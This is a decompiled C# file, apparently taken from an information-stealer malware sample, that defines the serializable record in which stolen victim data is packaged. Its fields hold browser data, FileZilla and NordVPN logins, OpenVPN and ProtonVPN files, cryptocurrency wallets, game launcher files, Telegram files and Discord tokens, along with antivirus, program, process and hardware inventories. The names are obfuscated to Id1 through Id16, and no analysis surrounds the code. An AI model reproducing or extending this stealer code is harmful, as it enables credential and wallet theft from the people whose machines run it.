using System;
using System.Collections.Generic;
using System.Runtime.Serialization;

// Token: 0x02000055 RID: 85
[DataContract(Name = "Entity1", Namespace = "Entity")]
[Serializable]
public class Entity_StolenData
{
	// Token: 0x17000035 RID: 53
	// (get) Token: 0x060001AD RID: 429 RVA: 0x00003768 File Offset: 0x00001968
	// (set) Token: 0x060001AE RID: 430 RVA: 0x00003770 File Offset: 0x00001970
	[DataMember(Name = "Id1")]
	public List<string> InstalledAVs { get; set; } = new List<string>();

	// Token: 0x17000036 RID: 54
	// (get) Token: 0x060001AF RID: 431 RVA: 0x00003779 File Offset: 0x00001979
	// (set) Token: 0x060001B0 RID: 432 RVA: 0x00003781 File Offset: 0x00001981
	[DataMember(Name = "Id2")]
	public List<string> AvailableLanguages { get; set; } = new List<string>();

	// Token: 0x17000037 RID: 55
	// (get) Token: 0x060001B1 RID: 433 RVA: 0x0000378A File Offset: 0x0000198A
	// (set) Token: 0x060001B2 RID: 434 RVA: 0x00003792 File Offset: 0x00001992
	[DataMember(Name = "Id3")]
	public List<string> InstalledPrograms { get; set; } = new List<string>();

	// Token: 0x17000038 RID: 56
	// (get) Token: 0x060001B3 RID: 435 RVA: 0x0000379B File Offset: 0x0000199B
	// (set) Token: 0x060001B4 RID: 436 RVA: 0x000037A3 File Offset: 0x000019A3
	[DataMember(Name = "Id4")]
	public List<string> RunningProcesses { get; set; } = new List<string>();

	// Token: 0x17000039 RID: 57
	// (get) Token: 0x060001B5 RID: 437 RVA: 0x000037AC File Offset: 0x000019AC
	// (set) Token: 0x060001B6 RID: 438 RVA: 0x000037B4 File Offset: 0x000019B4
	[DataMember(Name = "Id5")]
	public List<Entity_HardwareInfo> HardwareInfo { get; set; } = new List<Entity_HardwareInfo>();

	// Token: 0x1700003A RID: 58
	// (get) Token: 0x060001B7 RID: 439 RVA: 0x000037BD File Offset: 0x000019BD
	// (set) Token: 0x060001B8 RID: 440 RVA: 0x000037C5 File Offset: 0x000019C5
	[DataMember(Name = "Id6")]
	public List<Entity_Browser> StolenBrowsers { get; set; } = new List<Entity_Browser>();

	// Token: 0x1700003B RID: 59
	// (get) Token: 0x060001B9 RID: 441 RVA: 0x000037CE File Offset: 0x000019CE
	// (set) Token: 0x060001BA RID: 442 RVA: 0x000037D6 File Offset: 0x000019D6
	[DataMember(Name = "Id7")]
	public List<Entity_LoginData> CollectFilezilla { get; set; } = new List<Entity_LoginData>();

	// Token: 0x1700003C RID: 60
	// (get) Token: 0x060001BB RID: 443 RVA: 0x000037DF File Offset: 0x000019DF
	// (set) Token: 0x060001BC RID: 444 RVA: 0x000037E7 File Offset: 0x000019E7
	[DataMember(Name = "Id8")]
	public List<BrowserInfo> Browsers { get; set; } = new List<BrowserInfo>();

	// Token: 0x1700003D RID: 61
	// (get) Token: 0x060001BD RID: 445 RVA: 0x000037F0 File Offset: 0x000019F0
	// (set) Token: 0x060001BE RID: 446 RVA: 0x000037F8 File Offset: 0x000019F8
	[DataMember(Name = "Id9")]
	public List<Entity_StolenFile> GrabbedFiles { get; set; } = new List<Entity_StolenFile>();

	// Token: 0x1700003E RID: 62
	// (get) Token: 0x060001BF RID: 447 RVA: 0x00003801 File Offset: 0x00001A01
	// (set) Token: 0x060001C0 RID: 448 RVA: 0x00003809 File Offset: 0x00001A09
	[DataMember(Name = "Id10")]
	public List<Entity_StolenFile> GameLaunchers { get; set; } = new List<Entity_StolenFile>();

	// Token: 0x1700003F RID: 63
	// (get) Token: 0x060001C1 RID: 449 RVA: 0x00003812 File Offset: 0x00001A12
	// (set) Token: 0x060001C2 RID: 450 RVA: 0x0000381A File Offset: 0x00001A1A
	[DataMember(Name = "Id11")]
	public List<Entity_StolenFile> Wallets { get; set; } = new List<Entity_StolenFile>();

	// Token: 0x17000040 RID: 64
	// (get) Token: 0x060001C3 RID: 451 RVA: 0x00003823 File Offset: 0x00001A23
	// (set) Token: 0x060001C4 RID: 452 RVA: 0x0000382B File Offset: 0x00001A2B
	[DataMember(Name = "Id12")]
	public List<Entity_LoginData> NordApp { get; set; }

	// Token: 0x17000041 RID: 65
	// (get) Token: 0x060001C5 RID: 453 RVA: 0x00003834 File Offset: 0x00001A34
	// (set) Token: 0x060001C6 RID: 454 RVA: 0x0000383C File Offset: 0x00001A3C
	[DataMember(Name = "Id13")]
	public List<Entity_StolenFile> OpenVPN { get; set; }

	// Token: 0x17000042 RID: 66
	// (get) Token: 0x060001C7 RID: 455 RVA: 0x00003845 File Offset: 0x00001A45
	// (set) Token: 0x060001C8 RID: 456 RVA: 0x0000384D File Offset: 0x00001A4D
	[DataMember(Name = "Id14")]
	public List<Entity_StolenFile> ProtonVPN { get; set; }

	// Token: 0x17000043 RID: 67
	// (get) Token: 0x060001C9 RID: 457 RVA: 0x00003856 File Offset: 0x00001A56
	// (set) Token: 0x060001CA RID: 458 RVA: 0x0000385E File Offset: 0x00001A5E
	[DataMember(Name = "Id15")]
	public List<Entity_StolenFile> TelegramFiles { get; set; }

	// Token: 0x17000044 RID: 68
	// (get) Token: 0x060001CB RID: 459 RVA: 0x00003867 File Offset: 0x00001A67
	// (set) Token: 0x060001CC RID: 460 RVA: 0x0000386F File Offset: 0x00001A6F
	[DataMember(Name = "Id16")]
	public List<Entity_StolenFile> DiscordTokens { get; set; }
}
